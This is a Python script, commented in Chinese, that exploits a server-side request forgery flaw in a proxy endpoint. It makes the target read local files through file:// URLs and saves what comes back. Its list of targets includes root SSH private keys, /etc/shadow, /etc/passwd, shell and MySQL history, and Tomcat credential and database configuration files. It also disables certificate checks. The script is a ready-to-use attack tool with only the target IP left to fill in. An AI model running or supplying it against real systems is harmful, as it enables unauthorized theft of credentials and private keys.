import requests
import time

# 目标URL和已知目录列表
target_url = "https://填写你的IP:8080/demo/proxy?url=file://{}"
directories = [
    "/root/.ssh/authorized_keys",
    "/root/.ssh/id_rsa",
    "/root/.ssh/id_rsa.keystore",
    "/root/.ssh/known_hosts",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/issue",
    "/etc/fstab",
    "/etc/host.conf",
    "/var/log/xferlog",
    "/var/log/cron",
    "/etc/cron.d/",
    "/etc/crontab",
    "/var/log/secure",
    "/etc/rc.local",
    "/etc/motd",
    "/etc/sysctl.conf",
    "/var/log/syslog",
    "/etc/environment",
    "/etc/inputrc",
    "/etc/default/useradd",
    "/etc/login.defs",
    "/etc/skel",
    "/sbin/nologin",
    "/var/log/message",
    "/etc/httpd/conf/httpd.conf",
    "/etc/mtab",
    "/etc/ld.so.conf",
    "/etc/my.cnf",
    "/root/.bash_history",
    "/root/.mysql_history",
    "/proc/mounts",
    "/proc/config.gz",
    "/var/lib/mlocate/mlocate.db",
    "/proc/self/cmdline",
    "tomcat/conf/server.xml",
    "tomcat/webapps/ROOT/WEB-INF/classes/database.properties",
    "tomcat/conf/tomcat-users.xml",
]

# SSL证书验证设置为False（仅用于测试目的，不建议在生产环境中禁用）
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# 使用Session进行请求管理
with requests.Session() as session, open("ssrf_results.txt", "w") as file:
    for directory in directories:
        url = target_url.format(directory)
        try:
            response = session.get(url, verify=False)
            if response.status_code == 200:
                file.write(f"== Found: {directory} ==\n{response.text}\n\n")
            else:
                file.write(f"== Failed to access: {directory} with status code: {response.status_code} ==\n\n")
        except requests.RequestException as e:
            file.write(f"== Error accessing: {directory} ==\n{e}\n\n")
        
        # 每次请求后等待0.5秒
        time.sleep(0.5)

print("Results saved to ssrf_results.txt")
